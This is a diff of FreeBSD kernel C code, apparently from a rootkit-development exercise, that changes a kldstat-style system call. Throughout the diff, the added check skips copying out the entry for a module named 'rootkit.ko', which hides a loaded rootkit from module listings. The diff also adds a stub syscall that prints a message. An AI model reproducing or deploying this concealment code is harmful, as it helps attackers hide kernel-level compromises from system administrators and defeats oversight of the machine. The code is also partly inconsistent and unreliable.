@@ -34,9 +34,13 @@ __FBSDID("$FreeBSD$");
 #include <sys/syscall.h>
 
 
+int
+empty(struct thread *td, struct kldstat_args *uap);
+
 
 int
 sys_kldstat_mod(struct thread *td, struct kldstat_args *uap);
+
 int
 kern_kldstat_mod(struct thread *td, int fileid, struct kld_file_stat *stat);
 
@@ -49,8 +53,16 @@ static struct sx kld_sx;
 static linker_file_list_t linker_files;
 
 int
+empty(struct thread *td, struct kldstat_args *uap)
+{
+	uprintf("Empty() Called Succesfully\n");
+	return (0);
+}
+
+int
 sys_kldstat_mod(struct thread *td, struct kldstat_args *uap)
 {
+	//uprintf("yay\n");
 	struct kld_file_stat *stat;
 	int error, version;
 
@@ -65,8 +77,9 @@ sys_kldstat_mod(struct thread *td, struct kldstat_args *uap)
 		return (EINVAL);
 
 	stat = malloc(sizeof(*stat), M_TEMP, M_WAITOK | M_ZERO);
-	error = kern_kldstat_mod(td, uap->fileid, stat);
-	if (error == 0)
+	error = kern_kldstat(td, uap->fileid, stat);
+	//uprintf("checking... [%s]?\n", stat->name);
+	if (error == 0 && strcmp(stat->name, "rootkit.ko") != 0)
 		error = copyout(stat, uap->stat, version);
 	free(stat, M_TEMP);
 	return (error);
@@ -87,10 +100,12 @@ kern_kldstat_mod(struct thread *td, int fileid, struct kld_file_stat *stat)
 
 	sx_xlock(&kld_sx);
 	lf = linker_find_file_by_id(fileid);
-	if (lf == NULL || strcmp(lf->filename, "rootkit") == 0) { // XXX edit Here // TODO
+	//uprintf("lf->filename: [%s]\n", lf->filename);
+	if (lf == NULL /*|| strcmp(lf->filename, "rootkit.ko") == 0*/) { // TODO
 		sx_xunlock(&kld_sx);
 		return (ENOENT);
 	}
+
 
 	/* Version 1 fields: */
 	namelen = strlen(lf->filename) + 1;
@@ -124,5 +139,6 @@ linker_find_file_by_id(int fileid)
 			break;
 	return (lf);
 }
+
 
 #endif
